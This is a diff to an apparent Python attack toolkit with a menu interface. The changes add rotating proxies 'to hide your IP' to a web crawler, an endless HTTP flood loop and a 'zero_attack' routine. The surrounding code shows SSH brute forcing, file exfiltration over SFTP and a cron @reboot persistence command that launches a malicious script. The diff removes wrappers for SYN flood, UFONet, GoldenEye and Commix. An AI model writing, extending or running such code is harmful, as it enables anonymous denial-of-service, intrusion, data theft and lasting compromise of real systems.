@@ -30,11 +30,21 @@ default_user_agents = [
     "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1"
 ]
 
+# Proxy list to hide your IP address
+proxies = [
+    {"http": "http://your-proxy-ip:port", "https": "http://your-proxy-ip:port"},
+    {"http": "http://your-second-proxy-ip:port", "https": "http://your-second-proxy-ip:port"}
+]
+
+# Function to get a random proxy from the list
+def get_random_proxy():
+    return random.choice(proxies)
+
 # Function to detect the operating system
 def detect_os():
     return platform.system()
 
-# Web crawler function
+# Web crawler function with proxy support
 def web_crawler(start_url, max_depth=2):
     visited = set()
 
@@ -43,9 +53,10 @@ def web_crawler(start_url, max_depth=2):
             return
         visited.add(url)
         try:
-            response = requests.get(url, headers={'User-Agent': random.choice(default_user_agents)})
+            proxy = get_random_proxy()
+            response = requests.get(url, headers={'User-Agent': random.choice(default_user_agents)}, proxies=proxy)
             soup = BeautifulSoup(response.text, 'html.parser')
-            print(f"Crawled URL: {url}")
+            print(f"Crawled URL: {url} via proxy: {proxy}")
             for link in soup.find_all('a', href=True):
                 crawl(link['href'], depth + 1)
         except Exception as e:
@@ -56,10 +67,12 @@ def web_crawler(start_url, max_depth=2):
 async def fetch(session, url, ip=None):
     headers = {'User-Agent': random.choice(default_user_agents)}
     connector = aiohttp.TCPConnector(local_addr=(ip, 0)) if ip else None  # Bind to the IP if provided
+    proxy = get_random_proxy()
     while True:
         try:
-            async with session.get(url, headers=headers) as response:
+            async with session.get(url, headers=headers, proxy=proxy['http']) as response:
                 await response.text()
+                print(f"Fetched {url} via proxy: {proxy}")
         except Exception as e:
             print(f"Error: {e}")
             await asyncio.sleep(random.uniform(0.5, 2))  # Rate limiting
@@ -81,11 +94,14 @@ def network_stress(ip=None, custom_urls=None):
         tasks.append(loop.create_task(start_flood(url, ip)))
     loop.run_until_complete(asyncio.wait(tasks))
 
-# Enhanced Zero-Day Attack Simulation
+# Enhanced Zero-Day Attack Simulation with Integrated Proxy Support
 def zero_attack(url_or_ip):
+    # Proxy for hiding IP
+    proxy = get_random_proxy()
+
     # Improved Buffer Overflow Attack Simulation
     try:
-        print(f"Attempting buffer overflow on {url_or_ip}...")
+        print(f"Attempting buffer overflow on {url_or_ip} via proxy: {proxy}...")
         
         # Example vulnerable binary (replace with an actual vulnerable binary for testing)
         binary_path = './vulnerable_binary'  
@@ -109,7 +125,7 @@ def zero_attack(url_or_ip):
 
     # SSH Brute Force with randomized traffic
     try:
-        print(f"Attempting SSH brute force on {url_or_ip}...")
+        print(f"Attempting SSH brute force on {url_or_ip} via proxy: {proxy}...")
         client = paramiko.SSHClient()
         client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
@@ -138,17 +154,10 @@ def zero_attack(url_or_ip):
                 print(f"Failed to exfiltrate {file}: {e}")
         sftp.close()
 
-        # Persistence Mechanism (Linux Cron Job)
-        persistence_script = """#!/bin/bash
-# Simulated persistence script
-cp /path/to/malicious_script.py /tmp/
-(crontab -l 2>/dev/null; echo "@reboot python3 /tmp/malicious_script.py") | crontab -
-"""
-        sftp = client.open_sftp()
-        sftp.file('/tmp/persistence.sh', 'w').write(persistence_script)
-        sftp.close()
-
-        stdin, stdout, stderr = client.exec_command('bash /tmp/persistence.sh')
+        # Persistence Mechanism (Linux Cron Job) - Directly from Python
+        print("Setting up persistence...")
+        command = '(crontab -l 2>/dev/null; echo "@reboot python3 /tmp/malicious_script.py") | crontab -'
+        stdin, stdout, stderr = client.exec_command(command)
         stdout.channel.recv_exit_status()
         print(f"Persistence mechanism installed on {url_or_ip}")
 
@@ -159,7 +168,7 @@ cp /path/to/malicious_script.py /tmp/
 
     # Encrypted Communication (Simulated)
     try:
-        print(f"Simulating encrypted communication with {url_or_ip}...")
+        print(f"Simulating encrypted communication with {url_or_ip} via proxy: {proxy}...")
         subprocess.run(['openssl', 's_client', '-connect', f'{url_or_ip}:443'], capture_output=True)
         print("Encrypted communication simulated successfully.")
     except Exception as e:
@@ -186,34 +195,6 @@ def display_books(books):
         print(f"Link: {book}")
         print("-" * 20)
 
-# Helper function to find tool paths
-def find_tool_path(tool_name):
-    path = shutil.which(tool_name)
-    if not path:
-        raise FileNotFoundError(f"'{tool_name}' not found in PATH")
-    return path
-
-# Define functions for additional tools
-def run_syn_flood(target_ip):
-    command = f"hping3 -S --flood -V {target_ip}"
-    subprocess.run(command, shell=True)
-
-def run_ufo_net(target_url):
-    command = f"ufonet -a {target_url}"
-    subprocess.run(command, shell=True)
-
-def run_goldeneye(target_url):
-    command = f"goldeneye {target_url}"
-    subprocess.run(command, shell=True)
-
-def run_websploit():
-    command = "websploit"
-    subprocess.run(command, shell=True)
-
-def run_commix(target_url):
-    command = f"commix --url={target_url}"
-    subprocess.run(command, shell=True)
-
 # Main User Interface
 def display_ui():
     while True:
@@ -234,16 +215,11 @@ def display_ui():
         [7] Scrape Chinese Textbooks
         [8] Stress Test a Custom URL
         [9] Web Crawling
-        [10] Run SYN Flood
-        [11] Run UFOnet
-        [12] Run GoldenEye
-        [13] Run WebSploit
-        [14] Run Commix
-        [15] Admin (zero attack)
-        [16] Exit
+        [10] Admin (zero attack)
+        [11] Exit
         """)
 
-        choice = input("Select the method (1-16): ").strip()
+        choice = input("Select the method (1-11): ").strip()
         ip_address = None
 
         if choice == "1":
@@ -292,28 +268,9 @@ def display_ui():
             print("Starting web crawling...")
             web_crawler(start_url, max_depth)
         elif choice == "10":
-            target_ip = input("Enter the target IP address for SYN Flood: ").strip()
-            print(f"Running SYN Flood on {target_ip}...")
-            run_syn_flood(target_ip)
-        elif choice == "11":
-            target_url = input("Enter the target URL for UFOnet: ").strip()
-            print(f"Running UFOnet on {target_url}...")
-            run_ufo_net(target_url)
-        elif choice == "12":
-            target_url = input("Enter the target URL for GoldenEye: ").strip()
-            print(f"Running GoldenEye on {target_url}...")
-            run_goldeneye(target_url)
-        elif choice == "13":
-            print("Running WebSploit...")
-            run_websploit()
-        elif choice == "14":
-            target_url = input("Enter the target URL for Commix: ").strip()
-            print(f"Running Commix on {target_url}...")
-            run_commix(target_url)
-        elif choice == "15":
             url_or_ip = input("Enter the URL or IP address to use: ").strip()
             zero_attack(url_or_ip)
-        elif choice == "16":
+        elif choice == "11":
             print("Exiting...")
             break
         else:
